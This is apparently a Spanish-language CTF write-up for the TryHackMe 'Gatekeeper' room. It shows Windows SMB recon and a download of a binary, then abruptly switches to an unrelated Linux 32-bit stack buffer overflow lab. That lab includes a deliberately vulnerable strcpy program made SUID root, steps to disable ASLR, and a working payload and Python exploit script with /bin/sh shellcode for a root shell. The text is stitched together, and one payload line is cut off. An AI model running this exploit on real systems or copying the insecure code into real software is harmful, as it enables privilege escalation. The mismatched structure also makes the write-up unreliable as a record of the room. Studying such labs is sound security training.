---
title:  "Gatekeeper - Writeup - Tryhackme"
categories: 
  - Tryhackme
tags:
  - Buffer Overflow
  - Windows
  - eCPPT
toc: true
toc_label: "Tabla de contenido"
---

## Puertos

```bash
# Nmap 7.91 scan initiated Fri Oct  1 08:02:08 2021 as: nmap -sS --min-rate 200 -p- --open -n -v -Pn -oG allPorts -oN ports 10.10.239.240
Nmap scan report for 10.10.239.240
Host is up (0.22s latency).
Not shown: 33442 closed ports, 32087 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
31337/tcp open  Elite
49154/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Oct  1 08:04:21 2021 -- 1 IP address (1 host up) scanned in 133.34 seconds
```
## SO
```bash
crackmapexec smb 10.10.239.240
SMB         10.10.239.240   445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
```
## serviciosversiones
```bash
# Nmap 7.91 scan initiated Fri Oct  1 08:13:08 2021 as: nmap -sV -sC -p135,139,445,3389,31337,49154 -oN serviciosVersiones 10.10.239.240
Nmap scan report for 10.10.239.240
Host is up (0.18s latency).

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: GATEKEEPER
|   NetBIOS_Domain_Name: GATEKEEPER
|   NetBIOS_Computer_Name: GATEKEEPER
|   DNS_Domain_Name: gatekeeper
|   DNS_Computer_Name: gatekeeper
|   Product_Version: 6.1.7601
|_  System_Time: 2021-10-01T13:15:56+00:00
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2021-09-30T12:57:33
|_Not valid after:  2022-04-01T12:57:33
|_ssl-date: 2021-10-01T13:16:02+00:00; -1s from scanner time.
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49154/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=10/1%Time=61570976%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 47m59s, deviation: 1h47m20s, median: -1s
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:3b:f7:88:5b:77 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-10-01T09:15:56-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-01T13:15:56
|_  start_date: 2021-10-01T12:57:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct  1 08:16:04 2021 -- 1 IP address (1 host up) scanned in 175.85 seconds
```
![CompilaciónBuffLinux32](/assets/images/gatekeeperSmb.png)

smbmap
```bash
smbmap -H 10.10.239.240 -u 'null' -R Users
```
![CompilaciónBuffLinux32](/assets/images/gatekeeperExe.png)

Download 
```bash
smbclient //10.10.239.240/Users -N
cd Share
get gatekeeper.exe
```

Transfer 
![CompilaciónBuffLinux32](/assets/images/smbGatepeeker.png)
Immunity
![CompilaciónBuffLinux32](/assets/images/immunitypng)



















## Entorno
Antes de proceder con la explotación de un binario vulnerable a Buffer Overflow, deberemos establecer nuestro laboratorio.

Necesitaremos:
- Una máquina virtual Ubuntu 14.04.6 LTS de 32 bits.
- GDB-Peda
- Un binario vulnerable
- Shellcode
- Desactivar el ASLR

## Creación del binario

En cualquier editor de texto, por ejemplo **nano** copiaremos y pegaremos el siguiente código y lo guardaremos como **buff.c**.

```bash
#include <stdio.h>
#include <string.h>

int vuln(char *str)
{
    char buf[64];
    strcpy(buf,str);
    printf("Cadena: %s\n",buf);
    return 0;
}
int main(int argc, char* argv[])
{
    vuln(argv[1]);
}
```
## Compilación

Ahora vamos a compilar **buff.c**. Tras esto obtendremos nuestro binario **buff**.

**Nota:** Si ejecutamos **file buff** nos dirá que es un binario ejecutable de 32 bits.
{: .notice--danger}

```bash
gcc -g -fno-stack-protector -z execstack -m32 buff.c -o buff
```

![CompilaciónBuffLinux32](/assets/images/compilacionBuffLinux32bits.png)

## Permisos

Para obtener una shell como **root** luego de explotar el binario, otorgaremos permisos tal que el binario sea SUID y pertenezca a **root**.

Esto lo tenemos que hacer como el usuario **root**. Luego volveremos a migrar al usuario con pocos privilegios.

Todo esto para ver como siendo un usuario sin privilegios, aprovechándonos de la explotación de este binario seremos capaces de obtener una shell como un usuario privilegiado **(root)**.

```bash
chown root:root buff
chmod +s buff
```

![CompilaciónBuffLinux32](/assets/images/permisosBinarioBuffLinux32.png)

## Desactivar el ASLR

Para este caso como explotaremos un buffer overflow stack based de 32 bits necesitaremos desactivar el ASLR, que es el que se encarga de la aleatoriedad de las direcciones de la memoria.

Podemos ejecutar lo siguiente para poder saber si esta o no activado el ASLR.

```bash
ldd buff
```

![CompilaciónBuffLinux32](/assets/images/aslrActiveldd.png)

Como podemos ver las direcciones van cambiando, esto significa que el ASLR esta **activado**, por lo tanto una vez más como el usuario **root** lo desactivaremos.

Por defecto el valor de **randomize_va_space** es **"2"**.

```sql
cat /proc/sys/kernel/randomize_va_space
echo 0 > /proc/sys/kernel/randomize_va_space
```

Una vez realizado lo anterior el valor de **randomize_va_space** sera **"0"** y la aleatoriedad de las direcciones **(ASLR)** estarán desactivadas.

![CompilaciónBuffLinux32](/assets/images/aslrDesactived.png)

## GDB-Peda

Aquí puedes utilizar **GDB** normal, pero te recomiendo instales **Peda**, ya que esto trae utilidades que nos serán de ayuda para agilizar nuestra explotación.

**Recurso:** [Peda](https://github.com/longld/peda)

**Instalación:**

```python
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```
Una vez lo instales, al ejecutar **gdb**, debería aparecerte en rojo **gdb-peda$** como lo podemos observar en la imagen de la derecha.

![gdbVSpeda](/assets/images/installPeda.png)

Comandos que utilizaremos:

**1.** Ver los registros de la memoria.
```bash
i r
```

**2.** Crear cadenas aleatorias, en donde **"x"** es el número de la longitud de nuestra cadena.
```bash
pattern arg x
```

**3.** Ejecuta el binario.
```bash
r
```

**4.** Encuentra el tamaño del offset.
```bash
pattern search
```

**5.** Ver los últimos 100 registros de la pila.
```bash
x/100wx $esp
```

## Explotación

Lo que hace nuestro binario es recibir una cadena y luego imprimirla por pantalla.

Pero ¿Que pasaría si la cadena que le pasamos supera el tamaño de **buffer** que definimos en nuestro binario?.

Es ahí cuando abra un desbordamiento del buffer y esto nos permitirá tener el control sobre el binario, aprovechándonos de el EIP para apuntar a una dirección de la memoria en donde depositaremos nuestro shell code.

![Segmentation Fault](/assets/images/segmentationFault.png)

Para este paso puedes hacerlo manual como podemos observar en la imagen anterior o con python e ir probando con un número de caracteres aleatorios hasta ver en que punto se desborda el buffer.

```python
./buff $(python -c 'print "A"*10')
```

![Segmentation Fault](/assets/images/segmentationFaultPython.png)

Lo bueno de **Peda** es que también admite ejecución en python y aparte con sus utilidades seremos capaces de encontrar más fácilmente el offset y controlar el **EIP**.

![Segmentation Fault](/assets/images/segmentationFaultPeda.png)

### 1. Calculando el offset

- Ejecutaremos gdb pasándole como parámetro nuestro binario.
- Seguido crearemos una cadena aleatoria de 100 caracteres.
- Ejecutamos el binario con la cadena que creamos anteriormente.

```python
gdb buff
pattern arg 100
r
```

![Segmentation Fault](/assets/images/patternCreate.png)

### 2. Controlando el EIP

Gracias a **Peda** este paso es muy fácil, ya que con la cadena creada anteriormente basta con ejecutar el siguiente comando para encontrar el tamaño exacto del **offset** antes de sobre escribir el **EIP**.

```python
pattern search
```

![Segmentation Fault](/assets/images/patternSearch.png)

Como resultado obtenemos **76**, ese sera el número de **"A"** que imprimiremos seguidas de **4 bits** que serán nuestras **"B"**.

Sí como resultado en el **EIP** obtenemos nuestras **"B"** en hexadecimal **(0x42)** significa que tenemos efectivamente el control del **EIP**.

```python
r $(python -c 'print "A"*76 + "B"*4')
```

![Segmentation Fault](/assets/images/eipcontrol.png)

A esto le deberemos sumar los nobs **\x90** ya que esto nos ayudara a apuntar a una dirección donde estos se encuentren hasta que finalmente la ejecución llegue a nuestro shellcode.

```python
r $(python -c 'print "A"*76 + "B"*4 + "\x90"*100')
```
### 3. Elegimos una dirección en memoria.

Con el siguiente comando seremos capaces de ver los últimos 100 registros de la memoria, podemos observar que muestra nuestros nobs **"\x90"** en las columnas de la derecha, y a la izquierda se muestra la dirección en la memoria donde estos se encuentran.

Para continuar con nuestra explotación deberemos elegir cualquier dirección de memoria que contenga nuestros **"\x90"**.


```python
x/100wx $esp
```

![Segmentation Fault](/assets/images/memory.png)

### 4. Payload Final

Ya como paso final solo debemos unir todos los datos que hemos ido recolectando en los pasos anteriores.

- **Offset** = 76 `(multiplicar por "A").`
- **Dirección en memoria** = 0xbfffefa0 `(debe estar en formato Little-Endian="\xa0\xef\xff\xbf").`
- **Nobs** = \x90 `(en mi caso los multiplicare por 100 tu puedes multiplicarlo por cualquier número, mientras mayor sea la cantidad, mejor).`
- Shellcode = [Shell Code](https://www.exploit-db.com/exploits/43735) `(en mi caso elegí uno que me permite obtener una shell al ejecutarlo).`

```python
$(python -c 'print "A"*76 + "\xa0\xef\xff\xbf" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x4>
```

Si ejecutamos nuestro payload desde `gdb` podemos observar que en efecto nos devuelve nuestra shell, pero en este caso como el usuario con pocos privilegios.

![Segmentation Fault](/assets/images/shell.png)

Debemos ejecutar directamente el binario que creamos `(buff)` con nuestro payload para obtener nuestra shell como `root`.

![Segmentation Fault](/assets/images/rootShell.png)
	
## Recomendación

En la imagen anterior podemos observar que una vez ejecutamos el binario junto con nuestro payload, recibimos nuestra shell como root, pero también podemos ver en la parte inferior que pasándole un script en python, obtenemos el mismo resultado, de hecho este script lo que nos permite es evitarnos pasar manualmente nuestra dirección de memoria a formato **Little-Endian**, ya que esto puede ocasionar errores.

Para evitar eso el script utiliza la libreria `pack` que permite pasar la dirección de memoria a formato **Little-Endian** de forma automática.

```python
#!/usr/bin/python

from struct import pack

if __name__=='__main__':

        offset = 76
        junk = "A"*offset
        EIP = pack("<I", 0xbfffefa0)
        nops = "\x90"*100
        shell= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = junk + EIP + nops + shell

print payload
```
